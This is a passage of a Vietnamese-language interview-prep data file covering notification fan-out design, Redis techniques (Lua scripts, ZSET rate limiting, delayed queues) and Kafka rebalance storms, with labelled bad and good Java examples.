        interviewTip: 'Tại sao dùng MessageDigest.isEqual() để so sánh chữ ký mà không dùng String.equals()? Trả lời: Để chống tấn công Timing Attack! String.equals() trả về false ngay khi gặp ký tự khác biệt đầu tiên (thời gian so sánh ngắn hơn), giúp hacker đo đạc thời gian mili-giây để dò từng ký tự của chữ ký. MessageDigest.isEqual() chạy với thời gian hằng số (Constant Time), triệt tiêu hoàn toàn rò rỉ thông tin qua thời gian tính toán.'
      },
      {
        id: 'notification-push-pull',
        title: '8. Notification System: Kiến Trúc Push vs Pull Model & Xử Lý Celebrity/KOL',
        badge: 'Thiết Kế Hệ Thống Triệu User',
        summary: 'Thông báo cho 10 triệu follower: Fan-out on Write (Push) làm sập hệ thống. Fan-out on Read (Pull) làm lag ứng dụng. Áp dụng kiến trúc Hybrid chuẩn Facebook/Twitter.',
        explanation: `Thiết kế hệ thống thông báo (Notification System) hoặc Bảng tin (Newsfeed) là một trong những bài toán System Design kinh điển nhất.
Vấn đề cốt lõi xoay quanh mô hình phân phối tin: **Fan-out on Write (Push)** vs **Fan-out on Read (Pull)**.

**1. Mô hình Push (Fan-out on Write):**
- Khi người dùng đăng một bài viết mới:
  - Hệ thống lấy toàn bộ danh sách bạn bè/người theo dõi (Followers).
  - Tự động ghi bài viết này vào hộp thư / bảng tin của **tất cả mọi người theo dõi**.
- **Ưu điểm:** Khi người dùng mở app lên đọc, tốc độ cực nhanh $O(1)$ vì bảng tin đã được chuẩn bị sẵn trong Redis Timeline.
- **Hiểm họa (Celebrity Problem):** Nếu Sơn Tùng M-TP hoặc Elon Musk có 10,000,000 người theo dõi đăng bài:
  - Hệ thống phải thực hiện **10 triệu lượt ghi (Write Amplification)** cùng một lúc!
  - Queue bị nghẽn cứng, database bị ngập lụt, hệ thống sập!

**2. Mô hình Pull (Fan-out on Read):**
- Khi người dùng đăng bài: Hệ thống **chỉ lưu bài viết đó vào trang cá nhân của chính họ**, không đẩy cho ai cả.
- Khi một follower mở app lên: Hệ thống mới bắt đầu truy vấn danh sách những người họ follow, lấy bài viết mới nhất và gộp (Merge) lại theo thời gian.
- **Ưu điểm:** Không sợ Celebrity vì chi phí ghi chỉ là $O(1)$.
- **Nhược điểm:** Chi phí ĐỌC rất đắt đỏ và chậm chạp nếu một người theo dõi hàng ngàn tài khoản.

**3. Kiến trúc Hybrid (Lai tạo) - Vũ khí của Big Tech:**
- **Người dùng thông thường (< 5,000 followers):** Dùng **Push Model (Fan-out on Write)**. Đẩy ngay vào Redis ZSET của bạn bè.
- **Celebrity / KOL (> 5,000 followers):** Dùng **Pull Model (Fan-out on Read)**. Chỉ ghi vào bảng tin của Celebrity.
- Khi người dùng mở app: Đọc bảng tin cá nhân từ Redis Cache (Push) và chủ động kéo thêm các bài mới nhất từ các Celebrity mà họ theo dõi (Pull) rồi trộn lại.`,
        asciiDiagram: `[NGƯỜI DÙNG THƯỜNG (< 5K Follower)]
User A Post ───(Fan-out on Write)───> [Worker] ───> [Ghi vào Redis Feed của 200 Bạn Bè]
                                                    (Đọc cực nhanh 1ms!)

[CELEBRITY / KOL (> 1 Triệu Follower)]
Sơn Tùng Post ──(KHÔNG ĐẨY 10 TRIỆU LƯỢT)──> [Chỉ ghi vào Timeline của Sơn Tùng]
                                                              │
Follower B mở App ────────────────────────────────────────────┘
(Đọc Feed bạn bè + Kéo bài Sơn Tùng rồi trộn lại trên Client/BFF)` ,
        badCodeTitle: '❌ Vòng lặp Fan-out ngây thơ gây treo hệ thống khi gặp tài khoản lớn',
        badCode: `@Transactional
public void publishPost(Long authorId, String content) {
    Post post = postRepo.save(new Post(authorId, content));

    // ❌ THẢM HỌA: Nếu authorId có 2,000,000 followers:
    // Vòng for này sẽ tạo ra 2,000,000 bản ghi trong bảng feeds!
    // Server bị OutOfMemoryError và DB bị sập hoàn toàn!
    List<Long> followerIds = followRepo.findAllFollowerIds(authorId);
    for (Long fid : followerIds) {
        feedRepo.save(new UserFeed(fid, post.getId()));
    }
}`,
        goodCodeTitle: '✅ Phân tách luồng Kafka Hybrid theo lượng Followers',
        goodCode: `@Service
@RequiredArgsConstructor
public class HybridNotificationService {
    private final FollowerRepository followRepo;
    private final KafkaTemplate<String, Object> kafkaTemplate;
    private static final int CELEBRITY_THRESHOLD = 5000;

    public void dispatchPostNotification(Long authorId, Long postId) {
        long followerCount = followRepo.countFollowers(authorId);

        if (followerCount >= CELEBRITY_THRESHOLD) {
            // ✅ CELEBRITY: Dùng Pull Model -> Chỉ bắn event cập nhật Timeline của chính tác giả:
            kafkaTemplate.send("celebrity-post-topic", authorId.toString(), new CelebrityPostEvent(authorId, postId));
            log.info("Xử lý bài viết Celebrity authorId={} bằng Pull Model", authorId);
        } else {
            // ✅ NORMAL USER: Dùng Push Model (Fan-out on Write qua batching worker):
            kafkaTemplate.send("normal-fanout-topic", authorId.toString(), new FanoutPostEvent(authorId, postId));
        }
    }
}`,
        interviewTip: 'Khi phỏng vấn System Design hỏi: "Hệ thống thông báo đẩy (Push Notification) đến điện thoại qua FCM/APNS có gì khác với bảng tin?", trả lời: "Push Notification không thể gửi đồng loạt 10 triệu tin tức thì qua kết nối TCP. Ta phải phân chia danh sách thiết bị thành các chunk (ví dụ 1,000 tokens/chunk), đẩy vào hàng đợi phân tán Kafka với nhiều Consumer Pods chạy song song để gửi batch API lên Apple APNS và Google FCM, kết hợp Circuit Breaker để tránh bị Apple/Google rate-limit".'
      }
    ]
  },
  {
    id: 'redis-advanced-mastery',
    title: 'Redis Tuyệt Kỹ: Từ Cơ Bản Đến Phân Tán',
    icon: '💎',
    accentColor: '#ec4899',
    tagline: '5 Cấp độ làm chủ Redis từ các video chuyên sâu của: Data Structures, Pub/Sub, Lua Scripting, Sliding Window Rate Limiter & Redlock phân tán',
    topics: [
      {
        id: 'redis-5-levels',
        title: '1. 5 Cấp Độ Làm Chủ Redis Trong Thực Tế: Không Chỉ Là Bộ Nhớ Cache',
        badge: 'Lộ Trình Trưởng Thành',
        summary: 'Level 1: Key-Value Cache; Level 2: Data Structures (ZSET, Hash, Bitmaps); Level 3: Pub/Sub & Redis Streams; Level 4: Lua Scripting; Level 5: Redlock & Distributed Orchestration.',
        explanation: `Nhiều bạn Fresher/Junior khi phỏng vấn chỉ biết đến Redis với một câu duy nhất: "Redis là nơi lưu cache dạng Key-Value".
Trong thực tế tại các công ty lớn, kênh chia Redis thành **5 cấp độ tiến hóa**:

- **Level 1 (Cơ bản - Key/Value Caching):** Dùng lệnh \`SET\`, \`GET\` với chuỗi JSON để cache kết quả truy vấn database, giảm tải cho MySQL.
- **Level 2 (Thành thạo - Data Structures):**
  - **Hash (\`HSET\`, \`HGET\`):** Lưu trữ thông tin User, Giỏ hàng mà không cần parse cả cục JSON lớn.
  - **Sorted Set - ZSET (\`ZADD\`, \`ZRANGE\`):** Làm Bảng xếp hạng (Leaderboard) theo điểm số, Hàng đợi trì hoãn (Delay Queue), Sliding Window Rate Limiter.
  - **Bitmaps (\`SETBIT\`, \`BITCOUNT\`):** Lưu vết điểm danh hàng ngày của 10 triệu người dùng chỉ với 1.2 MB RAM!
  - **HyperLogLog (\`PFADD\`, \`PFCOUNT\`):** Đếm số lượng người truy cập duy nhất (Unique Visitors) hàng tỷ lượt với độ chính xác 99.2% chỉ tốn 12 KB bộ nhớ!
- **Level 3 (Hướng sự kiện - Message Broker):**
  - **Pub/Sub:** Thông báo tức thời giữa các microservices (Fire-and-forget).
  - **Redis Streams (Redis 5.0+):** Hỗ trợ Consumer Group, ACK, Message Persistence tương tự như một Kafka thu nhỏ.
- **Level 4 (Nguyên tử - Lua Scripting):** Gom cụm nhiều thao tác kiểm tra logic và ghi dữ liệu thành một Transaction nguyên tử tuyệt đối, loại bỏ hoàn toàn độ trễ mạng (Round-Trip Time) và Race Condition.
- **Level 5 (Phân tán - Distributed System Coordinator):**
  - Khóa phân tán (Distributed Lock) với Redlock trên nhiều node.
  - Điều phối hàng đợi, chống split-brain và đồng bộ trạng thái hệ sinh thái microservices.`,
        asciiDiagram: `[5 CẤP ĐỘ LÀM CHỦ REDIS THỰC CHIẾN]
▲ Level 5: Redlock & Distributed Lock (Điều phối cụm đa node, chống Split-Brain)
│ Level 4: Lua Scripting (Thực thi nguyên tử Logic phức tạp trên RAM)
│ Level 3: Redis Streams & Pub/Sub (Event-Driven, Consumer Group, ACK)
│ Level 2: Cấu trúc dữ liệu chuyên sâu (ZSET Leaderboard, Bitmaps, HyperLogLog)
└ Level 1: Key-Value Cache đơn giản (GET, SET, EXPIRE JSON Object)`,
        badCodeTitle: '❌ Xem Redis như một Memcached và serialize toàn bộ Object thành String',
        badCode: `// ❌ LEVEL 1 NGÂY THƠ: Sửa 1 trường nhỏ cũng phải serialize/deserialize cả cục JSON to đùng!
String userJson = redisTemplate.opsForValue().get("user:1001");
User user = objectMapper.readValue(userJson, User.class);
user.setLastLogin(Instant.now()); // Chỉ đổi 1 trường
// Ghi đè lại toàn bộ: Tốn băng thông mạng và tiềm ẩn ghi đè dữ liệu cũ của thread khác!
redisTemplate.opsForValue().set("user:1001", objectMapper.writeValueAsString(user));`,
        goodCodeTitle: '✅ Dùng Redis Hash & Bitmaps chuẩn Level 2',
        goodCode: `@Service
@RequiredArgsConstructor
public class RedisAdvancedService {
    private final StringRedisTemplate redisTemplate;

    // 1. Dùng Redis HASH: Chỉ cập nhật đúng 1 trường duy nhất (O(1) mạng và RAM):
    public void updateUserField(String userId, String field, String value) {
        redisTemplate.opsForHash().put("user:profile:" + userId, field, value);
    }

    // 2. Dùng BITMAP: Điểm danh người dùng theo ngày (1 ngày = 1 bit!):
    public void markUserAttendance(String userId, int dayOfYear) {
        // userId: 1001 điểm danh vào ngày thứ 85 trong năm:
        redisTemplate.opsForValue().setBit("attendance:" + userId, dayOfYear, true);
    }

    public boolean isUserAttended(String userId, int dayOfYear) {
        Boolean attended = redisTemplate.opsForValue().getBit("attendance:" + userId, dayOfYear);
        return Boolean.TRUE.equals(attended);
    }
}`,
        interviewTip: 'Phỏng vấn hỏi: "Tại sao Redis là Single-Threaded mà vẫn đạt 100,000 req/s?". Trả lời: "1. Toàn bộ dữ liệu nằm trên RAM, tốc độ đọc ghi nano-giây. 2. Sử dụng mô hình I/O Multiplexing (epoll/kqueue) non-blocking giúp 1 luồng quản lý hàng chục ngàn kết nối socket. 3. Các cấu trúc dữ liệu nội bộ bằng C (SDS, Skiplist, ZipList, Dict) được tối ưu bộ nhớ cực hạn. 4. Không tốn thời gian chuyển đổi ngữ cảnh (Context Switching) và không cần chi phí tranh chấp Lock giữa các luồng".'
      },
      {
        id: 'redis-lua-atomic-inventory',
        title: '2. Viết Redis Lua Script Khấu Trừ Tồn Kho Nguyên Tử & Tránh Race Condition',
        badge: 'Vũ Khí Nguyên Tử',
        summary: 'Lệnh GET rồi DECR trong Redis KHÔNG atomic nếu tách rời. Dùng Lua Script: Redis đảm bảo toàn bộ script chạy nguyên tử, không lệnh nào xen vào giữa được.',
        explanation: `Một sai lầm rất phổ biến khi làm chức năng mua hàng bằng Redis:
1. Java gọi: \`String stock = redis.get("item:stock");\`
2. Java kiểm tra: \`if (Integer.parseInt(stock) >= buyQty)\`
3. Java gọi tiếp: \`redis.decrby("item:stock", buyQty);\`

**Tại sao cách trên vẫn bị bán âm (Overselling)?**
Bởi vì giữa bước 1 (\`GET\`) và bước 3 (\`DECRBY\`), có hàng trăm request khác từ các thread/pod khác đã kịp xen vào đọc cùng giá trị \`stock\` đó!
Kể cả khi bạn dùng Redis Transaction (\`MULTI / EXEC\`), nó cũng **không cho phép bạn lấy kết quả của lệnh trước để làm điều kiện rẽ nhánh (IF-ELSE) cho lệnh sau**!

**Vũ khí tối thượng: Redis Lua Script**
- Kể từ Redis 2.6+, Redis tích hợp sẵn trình biên dịch ngôn ngữ **Lua**.
- Khi một đoạn mã Lua Script được gửi lên Redis:
  - Redis coi toàn bộ script đó là **MỘT LỆNH DUY NHẤT (Single Atomic Command)**.
  - Khi Lua script đang chạy, **không có bất kỳ command nào khác của client khác có thể xen ngang vào giữa**!
  - Toàn bộ việc đọc tồn kho, so sánh \`if stock >= qty\` và trừ tồn kho diễn ra nguyên tử 100% trong RAM của Redis.`,
        asciiDiagram: `[CÁCH TÁCH RỜI (NON-ATOMIC) ➔ DỄ LỖI]
Thread A: GET stock (thấy = 1)
Thread B:               GET stock (thấy = 1)
Thread A: DECRBY 1 ➔ stock = 0
Thread B:               DECRBY 1 ➔ stock = -1 (ÂM KHO! 💥)

[LUA SCRIPT (ATOMIC TRANSACTION) ➔ AN TOÀN TUYỆT ĐỐI]
Request A ──> ┌──────────────────────────────────────────────┐
              │ REDIS SINGLE THREAD THỰC THI LUA SCRIPT:     │
Request B ──> │ 1. Lấy stock                                 │ ──> Xong A (Thành công)
(Bị block     │ 2. So sánh: stock >= qty                     │
 chờ script A │ 3. Nếu đủ thì decrby, nếu thiếu thì trả về 0 │
 chạy xong)   └──────────────────────────────────────────────┘ ──> Đến lượt B (Hết hàng ➔ Trả 0)` ,
        badCodeTitle: '❌ Gọi lệnh Redis rời rạc gây Race Condition',
        badCode: `public boolean purchase(String productId, int qty) {
    // ❌ LỖI NGHIÊM TRỌNG: 2 câu lệnh rời rạc
    String currentStockStr = redisTemplate.opsForValue().get("stock:" + productId);
    int currentStock = Integer.parseInt(currentStockStr != null ? currentStockStr : "0");

    if (currentStock >= qty) {
        // Khoảng trống nguy hiểm giữa 2 lệnh: Thread khác đã kịp xen vào trừ kho!
        redisTemplate.opsForValue().decrement("stock:" + productId, qty);
        return true;
    }
    return false;
}`,
        goodCodeTitle: '✅ Đoạn mã Lua Script chuẩn khấu trừ tồn kho nguyên tử',
        goodCode: `@Service
public class RedisLuaStockService {
    @Autowired
    private StringRedisTemplate redisTemplate;

    // Script Lua kiểm tra và trừ kho nguyên tử 100%:
    private static final String STOCK_DEDUCT_LUA = """
        local stockKey = KEYS[1]
        local buyQty = tonumber(ARGV[1])
        local currentStock = tonumber(redis.call('get', stockKey) or '-1')

        if currentStock == -1 then
            return -1 -- Sản phẩm không tồn tại
        end

        if currentStock >= buyQty then
            redis.call('decrby', stockKey, buyQty)
            return 1 -- Trừ kho thành công
        else
            return 0 -- Hết hàng trong kho
        end
    """;

    private final RedisScript<Long> script = new DefaultRedisScript<>(STOCK_DEDUCT_LUA, Long.class);

    public int deductStockAtomic(String productId, int quantity) {
        List<String> keys = List.of("stock:" + productId);
        Long result = redisTemplate.execute(script, keys, String.valueOf(quantity));
        return result != null ? result.intValue() : 0;
    }
}`,
        interviewTip: 'Lưu ý sống còn khi viết Lua Script trong Redis: "1. Không được viết các câu lệnh tốn thời gian hoặc vòng lặp vô tận, vì Redis là single-thread, Lua script chạy lâu sẽ block toàn bộ server (Redis timeout sau 5 giây). 2. Khi chạy trong Redis Cluster, tất cả các KEYS truyền vào Lua script bắt buộc phải thuộc cùng một Hash Slot (sử dụng Hash Tag như {order_123}:stock và {order_123}:lock) để tránh lỗi CROSSSLOT Keys".'
      },
      {
        id: 'redis-sliding-window-rate-limit',
        title: '3. Xây Dựng Bộ Giới Hạn Tốc Độ (Rate Limiter) Trượt Thời Gian Bằng Redis ZSET',
        badge: 'Phòng Vệ Tấn Công & Spam',
        summary: 'Fixed Window bị lỗ hổng gấp đôi request ở biên giới thời gian (Boundary Trap). Dùng Redis Sorted Set (ZSET) làm Sliding Window Log chuẩn xác 100%.',
        explanation: `Rate Limiting là tấm khiên bảo vệ API trước các đợt tấn công DDoS, quét dữ liệu (Scraping) hoặc spam gửi OTP SMS làm tốn tiền doanh nghiệp.

**1. Lỗ hổng chết người của Fixed Window (Cửa sổ cố định):**
- Giả sử hệ thống quy định: "Tối đa 100 request / 1 phút".
- Dùng lệnh: \`INCR ratelimit:ip:timestamp_phút\` kèm TTL 60s.
- **Biên giới thời gian (Boundary Trap):**
  - Kẻ tấn công gửi 100 request ở giây thứ 59 của phút thứ 1.
  - Sang giây thứ 0 của phút thứ 2, bộ đếm bị reset về 0, kẻ đó tiếp tục gửi thêm 100 request nữa!
  - ➔ **Trong vòng chỉ 2 giây (giây 59 đến giây 61), hệ thống đã phải hứng chịu 200 request** (gấp đôi giới hạn cho phép), khiến server bị sập!

**2. Giải pháp chuẩn mực: Sliding Window Log với Redis Sorted Set (ZSET):**
Thay vì đếm số bằng một con số nguyên đơn thuần, ta lưu lại **chính xác từng mốc thời gian (Timestamp)** của các request gần nhất vào một Sorted Set:
- **Key:** \`rate:limit:<user_id_hoặc_ip>\`
- **Score:** Timestamp tính bằng mili-giây (\`System.currentTimeMillis()\`).
- **Member:** UUID hoặc \`timestamp-random\` duy nhất cho từng request.

**Thuật toán 4 bước trong một cửa sổ trượt (ví dụ: 100 req trong 60s):**
1. **Xóa các request đã quá hạn (cũ hơn 60 giây trước):**
   \`ZREMRANGEBYSCORE key 0 (now - 60,000)\`
2. **Đếm số lượng request còn tồn tại trong cửa sổ:**
   \`current_count = ZCARD key\`
3. **Kiểm tra giới hạn:**
   - Nếu \`current_count >= 100\` ➔ Từ chối request (Trả về HTTP 429 Too Many Requests).
4. **Nếu chưa vượt ngưỡng:**
   - Thêm request hiện tại vào ZSET: \`ZADD key now uuid\`.
   - Cài đặt thời gian sống: \`EXPIRE key 60\`.`,
        asciiDiagram: `[CỬA SỔ TRƯỢT (SLIDING WINDOW LOG) 60 GIÂY]
Thời gian trôi:  ─────[======== Cửa sổ quan sát 60s ========]──────> Hiện tại (Now)
                        │           │                 │
Request cũ (< 60s) ─────┘           │                 │
(Tự động xóa bằng ZREMRANGEBYSCORE) │                 │
                                    └── ZCARD = 85 ───┘
                                   (85 < 100 ➔ CHO PHÉP & ZADD!) ✅`,
        badCodeTitle: '❌ Fixed Window bị dồn cục ở ranh giới phút',
        badCode: `public boolean isRateLimitedFixed(String ip) {
    long currentMinute = System.currentTimeMillis() / 60000;
    String key = "ratelimit:" + ip + ":" + currentMinute;
    Long count = redisTemplate.opsForValue().increment(key);
    if (count != null && count == 1) {
        redisTemplate.expire(key, Duration.ofSeconds(60));
    }
    // ❌ CẠM BẪY BIÊN GIỚI: 100 req ở giây 59 + 100 req ở giây 00
    // => 200 requests dội vào server trong 2 giây!
    return count != null && count > 100;
}`,
        goodCodeTitle: '✅ Sliding Window Rate Limiter bằng Redis ZSET',
        goodCode: `@Service
@RequiredArgsConstructor
public class SlidingWindowRateLimiter {
    private final StringRedisTemplate redisTemplate;

    public boolean allowRequest(String apiKey, int maxRequests, long windowSizeMillis) {
        String key = "ratelimit:sliding:" + apiKey;
        long now = System.currentTimeMillis();
        long windowStart = now - windowSizeMillis;

        // Thực thi chuỗi lệnh quản lý ZSET:
        // 1. Xóa tất cả các phần tử cũ hơn cửa sổ trượt:
        redisTemplate.opsForZSet().removeRangeByScore(key, 0, windowStart);

        // 2. Đếm số lượng request còn lại trong cửa sổ trượt:
        Long currentRequests = redisTemplate.opsForZSet().zCard(key);

        if (currentRequests != null && currentRequests >= maxRequests) {
            return false; // Vượt quá giới hạn (Trả HTTP 429)
        }

        // 3. Thêm request mới vào ZSET với score là timestamp hiện tại:
        String requestId = UUID.randomUUID().toString();
        redisTemplate.opsForZSet().add(key, requestId, now);

        // 4. Gia hạn TTL để tự dọn dẹp RAM khi client dừng gọi:
        redisTemplate.expire(key, Duration.ofMillis(windowSizeMillis / 1000 + 10));

        return true; // Cho phép request đi tiếp
    }
}`,
        interviewTip: 'Khi phỏng vấn hỏi: "Nhược điểm lớn nhất của Sliding Window Log bằng ZSET là gì?", hãy trả lời: "Nhược điểm là tốn bộ nhớ RAM nếu lượng request quá lớn (1 triệu request sẽ lưu 1 triệu phần tử trong ZSET). Để cân bằng giữa độ chính xác và tiết kiệm RAM, các hệ thống Big Tech sẽ dùng Sliding Window Counter (kết hợp trọng số phần trăm của cửa sổ trước) hoặc thuật toán Token Bucket / Leaky Bucket".'
      },
      {
        id: 'redis-keyspace-delayed-pitfalls',
        title: '4. Redis Keyspace Notifications Cho Delay Queue: Ưu Điểm & Cạm Bẫy Cần Tránh',
        badge: 'Kinh Nghiệm Xương Máu',
        summary: 'Nhiều người dùng sự kiện key expired của Redis để kích hoạt hủy đơn hàng. Nhưng Redis xóa key theo cơ chế Lazy & Periodic nên sự kiện có thể bị trễ hàng giờ!',
        explanation: `Một ý tưởng rất phổ biến của các lập trình viên khi làm tính năng tự động hủy đơn hàng sau 15 phút:
1. Lưu đơn hàng vào Redis với TTL: \`SET order:cancel:101 "PENDING" EX 900\` (15 phút).
2. Bật tính năng **Redis Keyspace Notifications** (\`notify-keyspace-events Ex\`).
3. Đăng ký một Subscriber lắng nghe kênh: \`__keyevent@0__:expired\`.
4. Khi Redis phát ra thông báo key \`order:cancel:101\` hết hạn ➔ Server nhận được event và hủy đơn hàng!

**Tại sao TUYỆT ĐỐI KHÔNG NÊN dùng cách này cho các tác vụ nhạy cảm về thời gian hoặc tài chính?**

1. **Cơ chế xóa Key hết hạn của Redis là Lazy & Periodic (Lười biếng):**
   - Redis **KHÔNG hề hẹn giờ chính xác từng mili-giây** để xóa một key ngay khi nó hết hạn!
   - Redis chỉ xóa key theo 2 cách:
     - **Passive Expiration (Bị động):** Khi có một client nào đó gửi request đọc key đó (\`GET\`), Redis thấy nó quá hạn thì mới xóa và bắn event.
     - **Active Expiration (Chủ động):** Cứ mỗi 100ms, Redis quét ngẫu nhiên 20 key có cài đặt TTL. Nếu tỷ lệ key hết hạn > 25%, nó sẽ quét tiếp.
   - **HẬU QUẢ:** Nếu key không được ai đọc tới và RAM của Redis vẫn còn dồi dào, **event \`expired\` có thể bị trễ từ vài phút đến cả tiếng đồng hồ!** Đơn hàng 15 phút có thể 3 tiếng sau mới bị hủy!

2. **Redis Pub/Sub là Fire-and-forget (Gửi rồi quên):**
   - Sự kiện hết hạn được gửi qua cơ chế Pub/Sub thông thường.
   - Nếu đúng lúc key hết hạn mà Service của bạn đang Restart hoặc mạng bị rớt gói tin ➔ **Sự kiện bị mất vĩnh viễn!** Không có hàng đợi lưu trữ, không có cơ chế ACK, không có khả năng gửi lại!
   - Đơn hàng sẽ bị kẹt ở trạng thái PENDING mãi mãi và kho hàng bị giam vĩnh viễn!

**Giải pháp thay thế chuẩn xác:**
- Dùng **RabbitMQ Dead Letter Exchange (DLX)** (như đã học ở Topic 3).
- Hoặc dùng **Redisson RDelayedQueue** (hoạt động dựa trên Redis ZSET và Poller bền bỉ).`,
        asciiDiagram: `[CẠM BẪY REDIS KEYSPACE NOTIFICATION]
10:00 ──(Set TTL 15 phút)──> [Redis Key: order:cancel:101]
10:15 ──(Hết hạn trên lý thuyết)
           │
           ▼ (Redis chưa quét tới vì Lazy/Periodic Eviction!)
           │
10:45 ──(30 phút sau Redis mới rảnh quét tới!) ──> Bắn __keyevent@0__:expired
                                                              │
                                                              ▼
                                                   [Service nhận trễ 30 phút! 💥]`,
        badCodeTitle: '❌ Phụ thuộc vào key expired của Redis để chạy logic tài chính',
        badCode: `@Component
public class DangerousRedisKeyExpirationListener extends KeyExpirationEventMessageListener {
    public DangerousRedisKeyExpirationListener(RedisMessageListenerContainer listenerContainer) {
        super(listenerContainer);
    }

    @Override
    public void onMessage(Message message, byte[] pattern) {
        String expiredKey = message.toString();
        // ❌ CỰC KỲ NGUY HIỂM:
        // 1. Event này có thể bị trễ 30 phút - 1 tiếng so với thực tế!
        // 2. Nếu pod restart đúng lúc này, event mất 100% không bao giờ nhận lại được!
        if (expiredKey.startsWith("order:cancel:")) {
            Long orderId = Long.parseLong(expiredKey.replace("order:cancel:", ""));
            orderService.cancelAndRefund(orderId);
        }
    }
}`,
        goodCodeTitle: '✅ Dùng Redisson RDelayedQueue bền bỉ và chuẩn xác',
        goodCode: `@Service
@RequiredArgsConstructor
public class SafeDelayedOrderService {
    private final RedissonClient redissonClient;

    // Gửi đơn hàng vào hàng đợi chờ đúng 15 phút:
    public void scheduleOrderCancellation(Long orderId) {
        RBlockingQueue<Long> blockingQueue = redissonClient.getBlockingQueue("orderCancelQueue");
        RDelayedQueue<Long> delayedQueue = redissonClient.getDelayedQueue(blockingQueue);

        // ✅ Bền vững: Dữ liệu được lưu trong Redis ZSET, chuẩn xác từng giây
        // Kể cả server có sập khởi động lại thì task vẫn nằm nguyên trong Redis!
        delayedQueue.offer(orderId, 15, TimeUnit.MINUTES);
        log.info("Đã lên lịch hủy đơn sau 15 phút: orderId={}", orderId);
    }

    // Luồng lắng nghe xử lý khi đúng hạn 15 phút:
    @PostConstruct
    public void startDelayedOrderConsumer() {
        new Thread(() -> {
            RBlockingQueue<Long> blockingQueue = redissonClient.getBlockingQueue("orderCancelQueue");
            while (!Thread.currentThread().isInterrupted()) {
                try {
                    // Chờ và lấy đơn hàng vừa chín tới hạn:
                    Long orderId = blockingQueue.take();
                    orderService.cancelIfUnpaid(orderId);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
        }, "delayed-order-worker").start();
    }
}`,
        interviewTip: 'Khi phỏng vấn được hỏi: "Vậy tóm lại Redis Pub/Sub và Redis Keyspace Notifications phù hợp cho bài toán nào?", hãy trả lời: "Redis Pub/Sub chỉ phù hợp cho các dữ liệu tạm thời (Ephemerality) không sợ mất mát, ví dụ: Bắn tín hiệu hủy Local Cache (Caffeine/Guava) trên các Pod khi có dữ liệu mới, hoặc phòng chat hiển thị trạng thái online/typing. Với các bài toán liên quan đến trạng thái đơn hàng, tiền bạc và luồng nghiệp vụ, bắt buộc phải dùng Message Queue có tính bền vững (Persistent) như RabbitMQ DLX, Kafka hoặc Redis Streams".'
      }
    ]
  },
  {
    id: 'kafka-deep-internals',
    title: 'Kafka & Hạ Tầng Streaming Chuyên Sâu',
    icon: '🌪️',
    accentColor: '#06b6d4',
    tagline: 'Vận hành Kafka triệu message/giây từ kênh: Consumer Rebalance Storm, Linux Zero-Copy sendfile, Scale Partition & So sánh Redis Streams',
    topics: [
      {
        id: 'kafka-rebalance-storm',
        title: '1. Thảm Họa Consumer Rebalance Storm & Chiến Lược Cooperative Sticky Assignor',
        badge: 'Cơn Ác Mộng Vận Hành Kafka',
        summary: 'Consumer xử lý tác vụ quá lâu vượt ngưỡng max.poll.interval.ms sẽ bị Coordinator đá khỏi nhóm, kích hoạt bão Rebalance làm tê liệt toàn bộ luồng đọc (Stop-The-World).',
        explanation: `Trong quá trình vận hành Apache Kafka tại các công ty lớn, **Rebalance Storm (Bão tái cân bằng)** là sự cố kinh hoàng nhất:
1. **Nguyên nhân Consumer bị kick khỏi nhóm:**
   - Khi Consumer gọi \`poll()\`, nó kéo về một mẻ tin nhắn (ví dụ 500 records).
   - Nếu trong 500 records đó có các tác vụ gọi API bên ngoài (gọi ngân hàng, xuất file, gửi email) bị lag, khiến tổng thời gian xử lý vượt quá **\`max.poll.interval.ms\`** (mặc định là 5 phút).
   - Kafka Group Coordinator ngỡ rằng Consumer này đã bị treo hoặc chết ➔ **Đá văng Consumer ra khỏi Consumer Group!**

2. **Hậu quả của Eager Rebalance (Giao thức cũ):**
   - Coordinator kích hoạt Rebalance trên **TOÀN BỘ CÁC CONSUMER CÒN LẠI** trong nhóm.
   - Theo cơ chế **Eager Rebalance Protocol**, tất cả các Consumer buộc phải buông bỏ toàn bộ Partition đang xử lý (Revoke all partitions) ➔ **Stop-The-World toàn cụm!**
   - Các Consumer kết nối lại và chia lại Partition. Đúng lúc này, Consumer bị đá ban đầu lại tỉnh dậy và xin tham gia lại (Re-join) ➔ Lại kích hoạt thêm một đợt Rebalance mới!
   - Quá trình này lặp đi lặp lại tạo thành **vòng xoáy bão Rebalance vô tận**, Consumer Lag tăng vọt hàng triệu tin nhắn và hệ thống tê liệt hoàn toàn!

3. **3 Tuyến phòng vệ triệt tiêu Rebalance Storm:**
   - **Tuyến 1: Giảm \`max.poll.records\` và tăng \`max.poll.interval.ms\`:**
     - Đặt \`max.poll.records = 50\` (thay vì 500 mặc định). Đảm bảo Consumer luôn xử lý xong mẻ tin nhắn chỉ trong vài giây.
   - **Tuyến 2: Chuyển sang Cooperative Sticky Assignor (Kafka 2.4+):**
     - Đổi từ \`RangeAssignor\` sang **\`CooperativeStickyAssignor\`**.
     - Cơ chế này cho phép các Consumer khác **vẫn tiếp tục đọc Partition của mình bình thường**, chỉ có Partition bị chuyển nhượng mới phải tạm dừng (Incremental Rebalance), loại bỏ 95% thời gian đơ ứng dụng.
   - **Tuyến 3: Kiến trúc Worker Thread Pool (Decouple Poll vs Process):**
     - Luồng Consumer chỉ làm đúng một việc: \`poll()\` message về và đẩy ngay vào một nội bộ Java \`ThreadPoolExecutor\`. Sau đó tiếp tục gọi \`poll()\` để gửi nhịp tim cho Broker, không bao giờ lo bị timeout!`,
        asciiDiagram: `[EAGER REBALANCE (GIAO THỨC CŨ) ➔ STOP THE WORLD]
Consumer 1 (Bị lag quá 5m) ──> Bị Coordinator đá văng!
Coordinator: "TẤT CẢ BUÔNG HẾT PARTITION!" ──> [CẢ 5 POD NGỪNG ĐỌC HOÀN TOÀN] 💥

[COOPERATIVE STICKY (CHUẨN HIỆN ĐẠI) ➔ INCREMENTAL REBALANCE]
Consumer 1 (Lag) ──> Nhả P1
Consumer 2, 3, 4: VẪN ĐỌC P2, P3, P4 BÌNH THƯỜNG KHÔNG BỊ GIÁN ĐOẠN! ✅
Coordinator chỉ nhẹ nhàng giao P1 cho Consumer 2 (Không có Stop-The-World).`,
        badCodeTitle: '❌ Để cấu hình mặc định và xử lý tác vụ nặng trực tiếp trong listener',
        badCode: `// ❌ NGUY CƠ BÃO REBALANCE KHI TẢI TĂNG:
// max.poll.records mặc định = 500!
@KafkaListener(topics = "order-events", groupId = "order-group")
public void listen(ConsumerRecord<String, OrderEvent> record) {
